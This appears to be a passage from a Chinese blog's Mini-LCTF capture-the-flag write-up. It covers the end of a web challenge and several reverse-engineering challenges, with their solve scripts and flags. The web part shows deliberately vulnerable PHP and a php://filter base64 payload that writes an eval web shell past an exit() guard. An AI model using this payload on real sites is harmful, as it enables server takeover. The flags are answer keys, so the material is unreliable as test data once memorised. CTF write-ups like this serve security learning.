+<p><code>index.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//int_set("display_errors","On");</span></div><div class="line"><span class="keyword">if</span>($_POST[<span class="string">'shellname6ba3'</span>] &amp;&amp; $_POST[<span class="string">'content8b7e'</span>])&#123;</div><div class="line">    $prefix = <span class="string">"&lt;?php exit(you die); ?&gt;"</span>;</div><div class="line">    $content = $prefix.$_REQUEST[<span class="string">'content8b7e'</span>];</div><div class="line">    file_put_contents($_REQUEST[<span class="string">'shellname6ba3'</span>],$content);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$include_file = <span class="keyword">empty</span>($_GET[<span class="string">'file'</span>]) ? <span class="string">"photo"</span>:$_GET[<span class="string">'file'</span>];</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\.\./'</span>,$include_file))&#123;</div><div class="line">    <span class="keyword">exit</span>(<span class="string">'Impossible!'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">include</span>($include_file.<span class="string">'.php'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><code>photo.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])&#123;</div><div class="line">    $_GET[<span class="string">'id'</span>] = <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">query_filter</span><span class="params">($str)</span></span>&#123;</div><div class="line">    $str = strtolower($str);</div><div class="line">    $black_list = <span class="keyword">array</span>(<span class="string">"\\"</span>,<span class="string">"and"</span>,<span class="string">"or"</span>,<span class="string">" "</span>,<span class="string">"/"</span>,<span class="string">"*"</span>,<span class="string">"+"</span>,<span class="string">"="</span>,<span class="string">" "</span>,<span class="string">"\n"</span>);</div><div class="line">    $safe_str = str_replace($black_list,<span class="keyword">array</span>(<span class="string">''</span>),$str);</div><div class="line">    <span class="comment">/*</span></div><div class="line">    while($str !== $safe_str)&#123;</div><div class="line">        $str = $safe_str;</div><div class="line">        $safe_str = str_replace($black_list,array(''),$str);</div><div class="line">    &#125;</div><div class="line">     */</div><div class="line">    <span class="keyword">return</span> $safe_str;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$query_str = query_filter($_GET[<span class="string">'id'</span>]);</div><div class="line">$db_host = <span class="string">'localhost'</span>;</div><div class="line">$db_name = <span class="string">'xdsec'</span>;</div><div class="line">$db_username = <span class="string">'web'</span>;</div><div class="line">$db_password = <span class="string">"testr"</span>;</div><div class="line">$mysqli = mysqli_connect($db_host, $db_username, $db_password, $db_name);</div><div class="line"><span class="keyword">if</span>(!$mysqli)&#123;</div><div class="line">    <span class="keyword">exit</span>(<span class="string">"DB error!"</span>);</div><div class="line">&#125;</div><div class="line">$sql = <span class="string">"select * from pics where id ="</span>.$query_str;</div><div class="line"><span class="comment">//echo $sql;</span></div><div class="line">$result = $mysqli-&gt;query($sql);</div><div class="line"><span class="keyword">if</span>(!$result)&#123;</div><div class="line">    <span class="keyword">exit</span>(<span class="string">"Query failed!"</span>);</div><div class="line">&#125;</div><div class="line">$row = mysqli_fetch_row($result);</div><div class="line">$pre_link = <span class="string">"index.php?file=photo&amp;id="</span>.($_GET[<span class="string">'id'</span>]&lt;=<span class="number">1</span> ? <span class="number">1</span>:$_GET[<span class="string">'id'</span>]<span class="number">-1</span>);</div><div class="line">$next_link = <span class="string">"index.php?file=photo&amp;id="</span>.($_GET[<span class="string">'id'</span>]+<span class="number">1</span>);</div><div class="line"><span class="keyword">print</span> <span class="string">&lt;&lt;&lt;HTML</span></div><div class="line">&lt;html&gt;</div><div class="line">&lt;title&gt;&lt;/title&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;center&gt;</div><div class="line">    &lt;DIV ID="soccer"&gt;</div><div class="line">        &lt;img SRC="<span class="subst">&#123;$row[1]&#125;</span>" border="0" onclick="javascript:window.open(this.src);" style="cursor:pointer;"/&gt;</div><div class="line">    &lt;/DIV&gt;</div><div class="line">    &lt;hr&gt;</div><div class="line">    &lt;p&gt;Description: <span class="subst">&#123;$row[3]&#125;</span>&lt;/p&gt;</div><div class="line">    &lt;p&gt;Posted on <span class="subst">&#123;$row[2]&#125;</span>&lt;/p&gt;</div><div class="line">    &lt;hr&gt;</div><div class="line">    &lt;p&gt;&lt;a href="<span class="subst">&#123;$pre_link&#125;</span>"&gt;上一张&lt;/p&gt;&lt;p&gt;&lt;a href="<span class="subst">&#123;$next_link&#125;</span>"&gt;下一张&lt;/p&gt;</div><div class="line">    &lt;/center&gt;</div><div class="line">    &lt;SCRIPT&gt;</div><div class="line">var msecs=60;</div><div class="line">var counter=0;</div><div class="line">function soccerOnload()&#123;</div><div class="line">    setTimeout("blink()", msecs)</div><div class="line">&#125;</div><div class="line">function blink()&#123;</div><div class="line">    soccer.style.visibility=(soccer.style.visibility=="hidden") ? "visible" : "hidden"</div><div class="line">    counter+=1;</div><div class="line">    setTimeout("blink()", msecs)</div><div class="line">&#125;</div><div class="line">soccerOnload()</div><div class="line">    &lt;/SCRIPT&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">HTML;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>首先这个题目看网<br>址就能发现一个?file=photo参数,所以很有可能有文件包含,事实也是这样子的,所以我们先用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php://filter/convert.base64-encode/resource=index</div></pre></td></tr></table></figure></p>
+<p>读出index的源代码,得到了可以写文件的参数,但是无论如何都会在你写的文件前面加上exit,我们需要绕过这个exit</p>
+<p>所以构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">content8b7e=aaaPD9waHAgZXZhbCgkX1BPU1RbJ3QnXSkgPz4=&amp;shellname6ba3=php://filter/write=convert.base64-decode/resource=shell.php</div></pre></td></tr></table></figure>
+<p>content8b7e参数中前面的aaa是为了补齐&lt;?php exit(you die); ?&gt;中13个可以被base64解码的字节(phpexityoudie,其余的将被跳过)为16个字节,因为base64是每4个字节解码成3个字节,这样一来三个a连同前面的一起被当做base64编码解码成乱码从而绕过了exit的执行,后面的PD9waHAgZXZhbCgkX1BPU1RbJ3QnXSkgPz4=&amp;shellname6ba3=被解码成一句话木马写入文件,拿菜刀连上就可以了 关于参数shellname6ba3,不再详细解释,详见P总博客  <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p>PS: 这个题的数据库里还有”苏打门”的下载链接,Flag就是解压密码(当然…..下载下来以后其实是葫芦娃……)</p>
+<h2 id="0x08-Re"><a href="#0x08-Re" class="headerlink" title="0x08 Re"></a>0x08 Re</h2><p><strong>Easy GUI</strong></p>
+<p>Description: 最经典的Windows GUI逆向, 超简单的说.</p>
+<p>File: EasyGUI.zip</p>
+<p>WriteUp:</p>
+<p>的确是最经典的Windows GUI逆向. 由Win AIP写成.</p>
+<p>OD直接下断点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bp GetDlgItemTextA</div></pre></td></tr></table></figure>
+<p>断下来之后, Ctrl+F9回到用户空间, 直接就能找到验证部分的代码. 直接OD里面调试, 也可以根据地址在IDA里面读汇编/F5.</p>
+<p>或者全程IDA分析可以(Ctrl+F12显示字符串, 根据输出的字串定位代码位置).</p>
+<p>函数地址0x0401340, 加密方式是key和密文循环XOR, 计算后和输入进行比对(所以最懒得话可以直接在OD里试N次读出password).</p>
+<p>python脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">key = [ord(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">"WinAPI"</span>] * <span class="number">10</span></div><div class="line">secret = [<span class="number">0x20</span>,<span class="number">0x58</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x08</span>,<span class="number">0x58</span>,<span class="number">0x1D</span>,<span class="number">0x1E</span>,<span class="number">0x3F</span>,<span class="number">0x25</span>,<span class="number">0x33</span>]</div><div class="line">flag = []</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">13</span>):</div><div class="line">    flag.append(secret[i] ^ key[i])</div><div class="line"></div><div class="line">flag = <span class="string">""</span>.join([chr(s) <span class="keyword">for</span> s <span class="keyword">in</span> flag])</div><div class="line">print(flag)</div><div class="line"></div><div class="line"><span class="comment"># flag:</span></div><div class="line"><span class="comment"># w1napi_1s_old</span></div></pre></td></tr></table></figure>
+<hr>
+<p><strong>Easy Linux</strong></p>
+<p>Description: </p>
+<p>IDA不好用了…那你知道GDB么? Linux下的神级动态调试器哦. </p>
+<p>PS: 主程序是EasyLinux. 复制到虚拟机后记得”chmod +x EasyLinux”</p>
+<p>File: EasyLinux.zip</p>
+<p>WriteUp:</p>
+<p>就是个Linux下的逆向而已…其实非常简单.</p>
+<p>这个程序为了防止被IDA直接静态分析, 简单的玩了点低级的花招:</p>
+<p>data.dat实际上是个.so文件(Linux的dll), 执行主程序后主程序会装载这个data.dat(Linux下文件没有后缀名这一说法).</p>
+<p>真正的校验函数藏在这个data.dat中…所以有以下分析方案:</p>
+<ul>
+<li>直接IDA分析这个data.dat, IDA会识别出来. 然后F5大法即可. 但是要求能够看出data.dat的本质.</li>
+<li>在Linux下用GDB动态调试主程序, 因为很简单所以不是很难. 这也是本题当初的目的.</li>
+</ul>
+<p>装载data.dat的步骤发生在main函数执行之前. 读附带的源代码可以明白原理.</p>
+<p>校验函数及其简单, 仅仅是将密文的每一位和0xCC异或.</p>
+<p>python脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">secret = [<span class="number">0x9B</span>,<span class="number">0xFF</span>,<span class="number">0xA0</span>,<span class="number">0xAF</span>,<span class="number">0xFC</span>,<span class="number">0xA1</span>,<span class="number">0xA9</span>,<span class="number">0xFE</span>,<span class="number">0x80</span>,<span class="number">0xA5</span>,<span class="number">0xA2</span>,<span class="number">0xB9</span>,<span class="number">0xB4</span>]</div><div class="line">key = <span class="number">0xCC</span></div><div class="line"></div><div class="line">flag = [(key ^ x) <span class="keyword">for</span> x <span class="keyword">in</span> secret]</div><div class="line">flag = <span class="string">""</span>.join([chr(s) <span class="keyword">for</span> s <span class="keyword">in</span> flag])</div><div class="line"></div><div class="line">print(flag)</div><div class="line"></div><div class="line"><span class="comment"># flag</span></div><div class="line"><span class="comment"># W3lc0me2Linux</span></div></pre></td></tr></table></figure>
+<hr>
+<p><strong>壶中的大银河</strong></p>
+<p>Description: </p>
+<p>你知道Linux的signal机制么?</p>
+<p>这次是Easy级的, 根本没有难度嘛.</p>
+<p>File: Galaxy.zip</p>
+<p>WriteUp:</p>
+<p>有人吐槽之前LCTF出现了这个名字…实际上这个题目就是它的超简化版本(所以是Easy嘛).</p>
+<p>听起来很迷, 实际上仅仅是Linux Signal而已.</p>
+<p>首先程序在通过signal函数将校验函数和alarm信号关联起来. 然后正常的进行输入.</p>
+<p>得到用户输入后调用alarm(1). 该函数会在延迟1秒后生成alarm信号. 随后校验函数被调用.</p>
+<p>(Google Linux signal即可详细了解…)</p>
+<p>校验函数仍然不是很难, 在程序中被命名为handler. 用户输入被保存在全局变量中, 校验函数从中读取输入.</p>
+<p>输入要求长度为20. 然后对输入进行一次循环.</p>
+<ul>
+<li>偶数位(i = 0, 2, 4…): <code>input[i] = input[i] ^ 0x9</code></li>
+<li>奇数位(i = 1, 3, 5…): <code>input[i] = input[i] ^ input[0]</code></li>
+</ul>
+<p>计算后和正确字串进行比较, 若不相等则将一个全局变量置为0(否则为1). main函数根据该标志输出结果语句.</p>
+<p>python脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">secret = <span class="string">"8BVXznh]z^VXdAfC&#125;PgE"</span></div><div class="line">secret = [ord(x) <span class="keyword">for</span> x <span class="keyword">in</span> secret]</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">20</span>):</div><div class="line">    <span class="keyword">if</span> (i % <span class="number">2</span>) == <span class="number">0</span>:</div><div class="line">        secret[i] = secret[i] ^ <span class="number">0x09</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        secret[i] = secret[i] ^ secret[<span class="number">0</span>]</div><div class="line"></div><div class="line">flag = <span class="string">""</span>.join([chr(s) <span class="keyword">for</span> s <span class="keyword">in</span> secret])</div><div class="line">print(flag)</div><div class="line"></div><div class="line"><span class="comment"># flag</span></div><div class="line"><span class="comment"># 1s_is_also_important</span></div></pre></td></tr></table></figure>
+<hr>
+<p><strong>蓬莱的玉枝</strong></p>
+<p>Description: </p>
+<p>一样的GUI.</p>
+<p>有本事不拆使魔强行过呀(雾).</p>
+<p>File: rand.zip</p>
+<p>WriteUp:</p>
+<p>仍然是win API的GUI. 实际上除了校验部分和EasyGUI是一个图形界面…(图形界面长什么样无所谓嘛)</p>
+<p>在全局变量处保存了两个值seek和password, 均用于校验输入.</p>
+<p>在程序运行初始化时:</p>
+<ul>
+<li>计算程序文件的校验和, 如果文件被修改, 则校验和不相等, 修改全局变量中的seek.</li>
+</ul>
+<p>在校验函数执行前后:</p>
+<ul>
+<li>检测程序是否被调试器调试(仅仅使用了一个简单的API进行测试), 若没有被调试则将全局变量password的每一位和0x5异或.否则和0x9异或.</li>
+</ul>
+<p>除去这两步, 剩下的方法和EasyGUI基本没有区别.</p>
+<p>检验函数是使用rand生成一串序列, rand的种子数即为seek.</p>
+<p>之后将password和rand序列按位异或(都是异或233). 计算后和输入进行比对.</p>
+<p>得到flag思路: password ^ 0x5 -&gt; password ^ rand(seek = 17) -&gt; flag</p>
+<p>C脚本:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">//Flag:</div><div class="line">//LCTF&#123;learn_more_think_more&#125;</div><div class="line">//compile command : gcc -std=c99 -o getflag getflag.c</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char const *argv[])</div><div class="line">&#123;</div><div class="line">    unsigned int seek = 17;</div><div class="line">    unsigned char key = '\x05';</div><div class="line">    unsigned char randnum;</div><div class="line">    unsigned char res;</div><div class="line"></div><div class="line">    char password[] = "\x17\x14\xe7\x83\xa4\x63\xac\x91\xcb\xc5\x42\x4a\x8b\x5b\x9d\x93\x98\x5\x20\xb1\x29\xc1\x8c\x53\x92\x8d\x36";</div><div class="line"></div><div class="line">    srand(seek);</div><div class="line"></div><div class="line">    for(int i = 0; i &lt; strlen(password); ++i)&#123;</div><div class="line">        randnum = (unsigned char)((unsigned int)rand() % 0xFF);</div><div class="line">        res = password[i] ^ randnum;</div><div class="line">        res = res ^ key;</div><div class="line"></div><div class="line">        printf("%c", res);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    puts("");</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<hr>
+<p><strong>永遠の春夢</strong></p>
+<p>Description: </p>
+<p>**</p>
+<p>看似杂乱的没有通路…仔细观察下就会发现其实很简单呢~</p>
+<p>PS: 这次有FB了哦~</p>
+<p>Hint: SMC - Self Modify Code. 注意.text段的属性哦~</p>
+<p>File: 123.zip</p>
+<p>WriteUp:</p>
+<p>典型的SMC(self modify code)程序.</p>
+<p>具体的函数运行方式读源代码即可了解(已附在wp内).</p>
+<p>程序是在编译后手动进行的首次加密…可以写个脚本, 或者IDA Script, 也可以更暴力的直接用WinHex(内置了XOR Edit).</p>
+<p>简单来说, 程序在获取用户输入后会解密两块代码, 这两块代码分别对输入进行处理和检验.</p>
+<p>有趣的是, 在处理输入后, 程序会立即再次将代码块加密回去. 而且两个代码块是交替解密的 – 也就是说没法dump内存.</p>
+<p>对于这个程序, 因为逻辑简单, 所以定位了要解密的代码块的地址和长度以及使用的key后, 直接IDA Script(或者其他手段)将代码块全部还原.</p>
+<p>然后F5大法即可. 需要注意的是, 处理加解密的函数F5没法第一次就正确分析…或许直接读汇编就可以了(也可以修正F5的结果).</p>
+<p>这个里简单说一下校验:</p>
+<ul>
+<li>对于密文字串secret: <code>secret[i] = (secret[i] + 0x30) % 0xFF</code></li>
+<li>对于输入pd: <code>pd[i] = 0xFF &amp; (((pd[i] &lt;&lt; 4) &amp; 0xFF) | ((pd[i] &gt;&gt; 4) &amp; 0x0F))</code> (交换高低位)</li>
+<li>最后对pd和secret进行校验: <code>pd[i] ^ 0x55 == secret[i]</code></li>
+</ul>
+<p>python脚本:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">secret = [97, 49, 223, 1, 178, 48, 81, 49, 112, 147, 50, 112, 210, 162, 51, 147, 225, 210, 226, 23, 82]</div><div class="line">secret = [(x + 0x30) % 0xFF for x in secret]</div><div class="line">secret = [x ^ 0x55 for x in secret]</div><div class="line">secret = [0xFF &amp; (((x &lt;&lt; 4) &amp; 0xFF) | ((x &gt;&gt; 4) &amp; 0x0F)) for x in secret]</div><div class="line"></div><div class="line">flag = &quot;&quot;.join([chr(s) for s in secret])</div><div class="line">print(flag)</div><div class="line"></div><div class="line"># Flag:</div><div class="line"># LCTF&#123;SMC_is_excited!&#125;</div></pre></td></tr></table></figure>
+<hr>
+<p><strong>RE60</strong></p>
+<p>Description:考验你re基本功的时候到啦~</p>
+<p>File:re60.3111C1CAF04BADB492CC8CC37F61218B740B4818</p>
+<p>WriteUp:</p>
+<ol>
+<li><p>拿到文件先用file查看</p>
+<p><img src="http://7xou8t.com1.z0.glb.clouddn.com/snipaste_co38puChina Standard Timeernpm38e_u38ernpm38e_20161224_213838.png" alt="snipaste_co38puChina Standard Timeernpm38e_u38ernpm38e_20161224_213838"></p>
+</li>
+<li><p>IDA打开发现在main函数中的两个字符串</p>
+</li>
+</ol>
+<p><img src="http://7xou8t.com1.z0.glb.clouddn.com/snipaste_co42puChina Standard Timeernpm42e_u8ernpm42e_20161224_214208.png" alt="snipaste_co42puChina Standard Timeernpm42e_u8ernpm42e_20161224_214208"></p>
+<ol>
+<li><p>发现判断程序是否成功逻辑的函数</p>
+<p><img src="http://7xou8t.com1.z0.glb.clouddn.com/snipaste_co46puChina Standard Timeernpm46e_u2ernpm46e_20161224_214602.png" alt="snipaste_co46puChina Standard Timeernpm46e_u2ernpm46e_20161224_214602"></p>
+</li>
+<li><p>接着进一步查看下去，很容易发现关键算法就是字符串的逐位异或问题；HexStra就是我们的执行完异或算法的结果。</p>
+<p><img src="http://7xou8t.com1.z0.glb.clouddn.com/gjsf.png" alt="gjsf"></p>
+</li>
+<li><p>将上面两个字符串逐位异或即可得到flag：<code>AB7E032568F1084CD8C78B7650AE30BF</code>；</p>
+</li>
+</ol>
+<p><img src="http://7xou8t.com1.z0.glb.clouddn.com/snipaste_co13puChina Standard Timeernpm13e_u26ernpm13e_20161224_221326.png" alt="snipaste_co13puChina Standard Timeernpm13e_u26ernpm13e_20161224_221326"></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    
+     <div>    
+      
+      <ul class="post-copyright">
+         <li class="post-copyright-link">
+          <strong>本文作者：</strong>
+          <a href="/" title="欢迎访问 Pupil 的个人博客">Pupil</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文标题：</strong>
+          <a href="http://pupiles.com/Mini-LCTF_WriteUp.html" title="Mini-LCTF WriteUp">Mini-LCTF WriteUp</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文链接：</strong>
+          <a href="http://pupiles.com/Mini-LCTF_WriteUp.html" title="Mini-LCTF WriteUp">http://pupiles.com/Mini-LCTF_WriteUp.html</a>
+        </li>
+        <li class="post-copyright-date">
+            <strong>发布时间：</strong>2017年5月23日 - 16时05分
+        </li>  
+        <li class="post-copyright-license">
+          <strong>版权声明： </strong>
+          本文由 Pupil 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="license" target="_blank">保留署名-非商业性使用-禁止演绎 4.0-国际许可协议</a> </br>转载请保留以上声明信息！
+        </li>
+      </ul>
+    
+  </div>
+
+    <footer class="post-footer">
+		   
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/sql.html" rel="next" title="浅谈sql注入学习笔记与sqlmap的使用">
+                <i class="fa fa-chevron-left"></i> 浅谈sql注入学习笔记与sqlmap的使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/ISCC.html" rel="prev" title="ISCC2017Web writeup">
+                ISCC2017Web writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://olgkg6ct5.bkt.clouddn.com/touxiang.jpg"
+               alt="Pupil" />
+          <p class="site-author-name" itemprop="name">Pupil</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+		 <br><br>
+         <span id="busuanzi_container_site_uv">
+         <b><span id="busuanzi_value_site_uv"></span></b><br>
+		 <span class="site-state-item-name">访客</span>
+         </span><br><br>
+        </nav>
+
+        
+		
+		<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=432506345&auto=0&height=66"></iframe>
+		<div align="left" font-family: "Arial","Microsoft YaHei","黑体","宋体",sans-serif>
+		<b><h1>个人简介</h1></b>
+		<p >
+		菜鸡Web狗一只，中二病患者，热爱代码审计，被CTF折磨的要死要活，拼命学习中。。。<br>
+		爱好：二次元，web渗透，偶尔会突然很文艺<br>
+		QQ：89335778
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00"><span class="nav-number">1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Forensics"><span class="nav-number">2.</span> <span class="nav-text">0x01 Forensics</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Misc"><span class="nav-number">3.</span> <span class="nav-text">0x02 Misc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-PPC"><span class="nav-number">4.</span> <span class="nav-text">0x03 PPC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Mobile"><span class="nav-number">5.</span> <span class="nav-text">0x04 Mobile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Crypto"><span class="nav-number">6.</span> <span class="nav-text">0x05 Crypto</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Pwn"><span class="nav-number">7.</span> <span class="nav-text">0x06 Pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Web"><span class="nav-number">8.</span> <span class="nav-text">0x07 Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-Re"><span class="nav-number">9.</span> <span class="nav-text">0x08 Re</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pupil</span>
+</div>
+
+
+<div class="powered-by">
+  技术支持By Pupiles
+</div>
+
+<div class="theme-info">
+  博客 -XDSEC
+</div>
+
+
+<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
